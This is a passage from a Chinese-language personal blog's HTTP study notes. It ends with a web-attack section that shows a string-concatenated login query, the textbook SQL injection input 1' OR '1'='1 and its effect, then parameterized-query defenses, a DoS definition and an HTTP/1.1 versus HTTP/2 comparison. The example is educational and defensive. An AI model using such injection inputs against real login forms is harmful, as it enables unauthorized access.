<h3 id="2-攻击原理"><a href="#2-攻击原理" class="headerlink" title="2. 攻击原理"></a>2. 攻击原理</h3><p>例如一个网站登录验证的 SQL 查询代码为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strSQL = &quot;SELECT * FROM users WHERE </span><br><span class="line">(name = &apos;&quot; + userName + &quot;&apos;) AND (pw = &apos;&quot;+ passWord +&quot;&apos;);&quot;</span><br></pre></td></tr></table></figure>
<p>如果填入以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userName = &quot;1&apos; OR &apos;1&apos;=&apos;1&quot;;</span><br><span class="line">passWord = &quot;1&apos; OR &apos;1&apos;=&apos;1&quot;;</span><br></pre></td></tr></table></figure>
<p>那么 SQL 查询字符串为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = &quot;SELECT * FROM users WHERE (name = &apos;1&apos; OR &apos;1&apos;=&apos;1&apos;) and (pw = &apos;1&apos; OR &apos;1&apos;=&apos;1&apos;);&quot;</span><br></pre></td></tr></table></figure>
<p>此时无需验证通过就能执行以下查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = &quot;SELECT * FROM users;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="3-防范手段-1"><a href="#3-防范手段-1" class="headerlink" title="3. 防范手段"></a>3. 防范手段</h3><p><strong>（一）使用参数化查询</strong></p>
<p>以下以 Java 中的 <code>PreparedStatement</code>为例，它是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于<strong>没有拼接的过程</strong>，因此可以防止 SQL 注入的发生。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement stmt = connection.prepareStatement(</span><br><span class="line">          &quot;SELECT * FROM users WHERE userid=? AND password=?&quot;);</span><br><span class="line">stmt.setString(1, userid);</span><br><span class="line">stmt.setString(2, password);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure>
<p><strong>（二）单引号转换</strong></p>
<p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p>
<h2 id="拒绝服务攻击—DoS"><a href="#拒绝服务攻击—DoS" class="headerlink" title="拒绝服务攻击—DoS"></a>拒绝服务攻击—DoS</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统<strong>资源耗尽</strong>，使服务暂时中断或停止，导致其正常用户无法访问。</p>
<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
<h1 id="八-各版本比较"><a href="#八-各版本比较" class="headerlink" title="八. 各版本比较"></a>八. 各版本比较</h1><h2 id="HTTP-1-0-与-HTTP-1-1-的区别"><a href="#HTTP-1-0-与-HTTP-1-1-的区别" class="headerlink" title="HTTP/1.0 与 HTTP/1.1 的区别"></a>HTTP/1.0 与 HTTP/1.1 的区别</h2><p>HTTP/1.1 新增了以下内容：</p>
<ul>
<li>默认为长连接</li>
<li>提供了范围请求功能</li>
<li>提供了虚拟主机的功能</li>
<li>多了一些缓存处理字段</li>
<li>多了一些状态码</li>
</ul>
<h2 id="HTTP-1-1-与-HTTP-2-0-的区别"><a href="#HTTP-1-1-与-HTTP-2-0-的区别" class="headerlink" title="HTTP/1.1 与 HTTP/2.0 的区别"></a>HTTP/1.1 与 HTTP/2.0 的区别</h2><h3 id="1-多路复用"><a href="#1-多路复用" class="headerlink" title="1. 多路复用"></a>1. 多路复用</h3><p>HTTP/2.0 使用多路复用技术，使用同一个 TCP 连接来处理多个请求。</p>
<h3 id="2-首部压缩"><a href="#2-首部压缩" class="headerlink" title="2. 首部压缩"></a>2. 首部压缩</h3><p>HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求通讯<strong>双方各自缓存一份首部字段表</strong>，从而避免了重复传输。</p>
<h3 id="3-服务端推送"><a href="#3-服务端推送" class="headerlink" title="3. 服务端推送"></a>3. 服务端推送</h3><p>在客户端请求一个资源时，会把<strong>相关的资源一起发送给客户端</strong>，客户端就不需要再次发起请求了。例如客户端请求 index.html 页面，服务端就把 index.js 一起发给客户端。</p>
<h3 id="4-二进制格式"><a href="#4-二进制格式" class="headerlink" title="4. 二进制格式"></a>4. 二进制格式</h3><p>HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式。</p>
<p>参考资料<br>上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014.<br><a href="https://github.com/CyC2018/Interview-Notebook/blob/master/notes/HTTP.md" target="_blank" rel="noopener">复习图解 HTTP</a><br><a href="https://www.bookstack.cn/read/Interview-Notebook/notes-HTTP.md" target="_blank" rel="noopener">复习HTTP</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/HTTP/" rel="tag"><i class="fa fa-tag"></i> HTTP</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/07/25/剑指offer-49/" rel="next" title="剑指offer-49">
                <i class="fa fa-chevron-left"></i> 剑指offer-49
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/07/29/Log4j简单使用/" rel="prev" title="Log4j简单使用">
                Log4j简单使用 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">杨旭东</p>
              <p class="site-description motion-element" itemprop="description">种一棵树最好的时间是十年前，其次是现在</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">64</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">37</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/stoneyang94" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.jianshu.com/u/f7b90f4a10ae" target="_blank" title="简书">
                      
                        <i class="fa fa-fw fa-book"></i>简书</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一-基础概念"><span class="nav-number">1.</span> <span class="nav-text">一. 基础概念</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-基础"><span class="nav-number">1.1.</span> <span class="nav-text">Web 基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URL"><span class="nav-number">1.2.</span> <span class="nav-text">URL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#请求和响应报文"><span class="nav-number">1.3.</span> <span class="nav-text">请求和响应报文</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二-HTTP-方法"><span class="nav-number">2.</span> <span class="nav-text">二. HTTP 方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GET"><span class="nav-number">2.1.</span> <span class="nav-text">GET</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HEAD"><span class="nav-number">2.2.</span> <span class="nav-text">HEAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST"><span class="nav-number">2.3.</span> <span class="nav-text">POST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET-和-POST对比"><span class="nav-number">2.4.</span> <span class="nav-text">GET 和 POST对比</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-安全性"><span class="nav-number">2.4.1.</span> <span class="nav-text">1. 安全性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-编码"><span class="nav-number">2.4.1.1.</span> <span class="nav-text">2. 编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-服务器状态"><span class="nav-number">2.4.2.</span> <span class="nav-text">3. 服务器状态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-幂等性"><span class="nav-number">2.4.3.</span> <span class="nav-text">4. 幂等性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-可缓存"><span class="nav-number">2.4.4.</span> <span class="nav-text">5. 可缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-响应过程"><span class="nav-number">2.4.5.</span> <span class="nav-text">6. 响应过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PUT"><span class="nav-number">2.5.</span> <span class="nav-text">PUT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PATCH"><span class="nav-number">2.6.</span> <span class="nav-text">PATCH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DELETE"><span class="nav-number">2.7.</span> <span class="nav-text">DELETE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OPTIONS"><span class="nav-number">2.8.</span> <span class="nav-text">OPTIONS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CONNECT"><span class="nav-number">2.9.</span> <span class="nav-text">CONNECT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TRACE"><span class="nav-number">2.10.</span> <span class="nav-text">TRACE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三-HTTP-状态码"><span class="nav-number">3.</span> <span class="nav-text">三. HTTP 状态码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1XX-信息"><span class="nav-number">3.1.</span> <span class="nav-text">1XX 信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2XX-成功"><span class="nav-number">3.2.</span> <span class="nav-text">2XX 成功</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3XX-重定向"><span class="nav-number">3.3.</span> <span class="nav-text">3XX 重定向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4XX-客户端错误"><span class="nav-number">3.4.</span> <span class="nav-text">4XX 客户端错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5XX-服务器错误"><span class="nav-number">3.5.</span> <span class="nav-text">5XX 服务器错误</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#四-HTTP-首部"><span class="nav-number">4.</span> <span class="nav-text">四. HTTP 首部</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#通用首部字段"><span class="nav-number">4.1.</span> <span class="nav-text">通用首部字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#请求首部字段"><span class="nav-number">4.2.</span> <span class="nav-text">请求首部字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#响应首部字段"><span class="nav-number">4.3.</span> <span class="nav-text">响应首部字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实体首部字段"><span class="nav-number">4.4.</span> <span class="nav-text">实体首部字段</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五-具体应用"><span class="nav-number">5.</span> <span class="nav-text">五. 具体应用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookie"><span class="nav-number">5.1.</span> <span class="nav-text">Cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Cookie用途"><span class="nav-number">5.1.1.</span> <span class="nav-text">1. Cookie用途</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Cookie创建过程"><span class="nav-number">5.1.2.</span> <span class="nav-text">2. Cookie创建过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Cookie分类"><span class="nav-number">5.1.3.</span> <span class="nav-text">3. Cookie分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-JavaScript-获取-Cookie"><span class="nav-number">5.1.4.</span> <span class="nav-text">4. JavaScript 获取 Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Secure-和-HttpOnly"><span class="nav-number">5.1.5.</span> <span class="nav-text">5. Secure 和 HttpOnly</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Cookie作用域"><span class="nav-number">5.1.6.</span> <span class="nav-text">6. Cookie作用域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Session"><span class="nav-number">5.1.7.</span> <span class="nav-text">7. Session</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用-Session-维护用户登录的过程"><span class="nav-number">5.1.7.1.</span> <span class="nav-text">使用 Session 维护用户登录的过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-浏览器禁用-Cookie"><span class="nav-number">5.1.8.</span> <span class="nav-text">8. 浏览器禁用 Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-Cookie-与-Session-选择"><span class="nav-number">5.1.9.</span> <span class="nav-text">9. Cookie 与 Session 选择</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓存"><span class="nav-number">5.2.</span> <span class="nav-text">缓存</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-缓存优点"><span class="nav-number">5.2.1.</span> <span class="nav-text">1. 缓存优点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-缓存实现方法"><span class="nav-number">5.2.2.</span> <span class="nav-text">2. 缓存实现方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-控制缓存—Cache-Control"><span class="nav-number">5.2.3.</span> <span class="nav-text">3. 控制缓存—Cache-Control</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#连接管理"><span class="nav-number">5.3.</span> <span class="nav-text">连接管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#短连接与长连接"><span class="nav-number">5.3.1.</span> <span class="nav-text">短连接与长连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#流水线"><span class="nav-number">5.3.2.</span> <span class="nav-text">流水线</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内容协商"><span class="nav-number">5.4.</span> <span class="nav-text">内容协商</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-内容协商类型"><span class="nav-number">5.4.1.</span> <span class="nav-text">1. 内容协商类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Vary"><span class="nav-number">5.4.2.</span> <span class="nav-text">2. Vary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内容编码"><span class="nav-number">5.5.</span> <span class="nav-text">内容编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#范围请求"><span class="nav-number">5.6.</span> <span class="nav-text">范围请求</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-指定请求的范围—Range"><span class="nav-number">5.6.1.</span> <span class="nav-text">1.指定请求的范围—Range</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-指定处理的范围—Accept-Ranges"><span class="nav-number">5.6.2.</span> <span class="nav-text">2. 指定处理的范围—Accept-Ranges</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-响应状态码"><span class="nav-number">5.6.3.</span> <span class="nav-text">3. 响应状态码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分块传输编码"><span class="nav-number">5.7.</span> <span class="nav-text">分块传输编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多部分对象集合"><span class="nav-number">5.8.</span> <span class="nav-text">多部分对象集合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#虚拟主机"><span class="nav-number">5.9.</span> <span class="nav-text">虚拟主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通信数据转发"><span class="nav-number">5.10.</span> <span class="nav-text">通信数据转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-代理"><span class="nav-number">5.10.1.</span> <span class="nav-text">1. 代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-网关"><span class="nav-number">5.10.2.</span> <span class="nav-text">2. 网关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-隧道"><span class="nav-number">5.10.3.</span> <span class="nav-text">3. 隧道</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#六-HTTPs"><span class="nav-number">6.</span> <span class="nav-text">六. HTTPs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#加密"><span class="nav-number">6.1.</span> <span class="nav-text">加密</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-对称密钥加密"><span class="nav-number">6.1.1.</span> <span class="nav-text">1. 对称密钥加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-非对称密钥加密"><span class="nav-number">6.1.2.</span> <span class="nav-text">2. 非对称密钥加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-HTTPs-采用的加密方式"><span class="nav-number">6.1.3.</span> <span class="nav-text">3. HTTPs 采用的加密方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#认证"><span class="nav-number">6.2.</span> <span class="nav-text">认证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整性保护"><span class="nav-number">6.3.</span> <span class="nav-text">完整性保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTPs-的缺点"><span class="nav-number">6.4.</span> <span class="nav-text">HTTPs 的缺点</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#七-Web-攻击技术"><span class="nav-number">7.</span> <span class="nav-text">七. Web 攻击技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击模式"><span class="nav-number">7.1.</span> <span class="nav-text">攻击模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#主动攻击"><span class="nav-number">7.1.1.</span> <span class="nav-text">主动攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#被动攻击"><span class="nav-number">7.1.2.</span> <span class="nav-text">被动攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跨站脚本攻击—XSS"><span class="nav-number">7.2.</span> <span class="nav-text">跨站脚本攻击—XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-概念"><span class="nav-number">7.2.1.</span> <span class="nav-text">1. 概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-危害"><span class="nav-number">7.2.2.</span> <span class="nav-text">2. 危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-防范手段"><span class="nav-number">7.2.3.</span> <span class="nav-text">3. 防范手段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跨站请求伪造—CSRF"><span class="nav-number">7.3.</span> <span class="nav-text">跨站请求伪造—CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-概念-1"><span class="nav-number">7.3.1.</span> <span class="nav-text">1. 概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-防范手段"><span class="nav-number">7.3.2.</span> <span class="nav-text">2. 防范手段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-注入攻击"><span class="nav-number">7.4.</span> <span class="nav-text">SQL 注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-概念-2"><span class="nav-number">7.4.1.</span> <span class="nav-text">1. 概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-攻击原理"><span class="nav-number">7.4.2.</span> <span class="nav-text">2. 攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-防范手段-1"><span class="nav-number">7.4.3.</span> <span class="nav-text">3. 防范手段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拒绝服务攻击—DoS"><span class="nav-number">7.5.</span> <span class="nav-text">拒绝服务攻击—DoS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#八-各版本比较"><span class="nav-number">8.</span> <span class="nav-text">八. 各版本比较</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-1-0-与-HTTP-1-1-的区别"><span class="nav-number">8.1.</span> <span class="nav-text">HTTP/1.0 与 HTTP/1.1 的区别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-1-1-与-HTTP-2-0-的区别"><span class="nav-number">8.2.</span> <span class="nav-text">HTTP/1.1 与 HTTP/2.0 的区别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-多路复用"><span class="nav-number">8.2.1.</span> <span class="nav-text">1. 多路复用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-首部压缩"><span class="nav-number">8.2.2.</span> <span class="nav-text">2. 首部压缩</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-服务端推送"><span class="nav-number">8.2.3.</span> <span class="nav-text">3. 服务端推送</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-二进制格式"><span class="nav-number">8.2.4.</span> <span class="nav-text">4. 二进制格式</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">杨旭东</span>

  
</div>

<!-- 20180426 -->
<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>


<!-- 20180425

  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>

-->

<!-- 20180425

  <span class="post-meta-divider">|</span>

-->

<!-- 20180425

  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>

-->



        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

  <!--页面点击小红心 -->
  <script type="text/javascript" src="/js/src/love.js"></script>>
    <!--背景动画 -->
  <script type="text/javascript" src="/js/src/background.js"></script>>
</body>
</html>
